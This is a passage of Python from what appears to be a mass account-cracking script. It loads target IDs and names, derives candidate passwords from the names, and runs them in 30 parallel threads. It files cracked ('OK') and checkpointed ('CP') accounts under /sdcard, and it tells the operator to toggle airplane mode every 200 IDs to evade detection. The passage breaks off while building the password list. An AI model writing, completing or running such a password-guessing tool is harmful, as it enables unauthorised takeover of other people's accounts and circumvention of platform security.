def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	tree = Tree(' ')
	tree.add(f'{h}OK SAVE IN /sdcard/OK/%s {P}'%(okc))
	tree.add(f'{k}CP SAVE IN /sdcard/CP/%s {P}'%(cpc))
	cetak(tree)
	print(f'\n\t\t\t{P}ON/OF MODE PESAWAT SETIAP {M}200 {P}IDZ')
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(nmf)

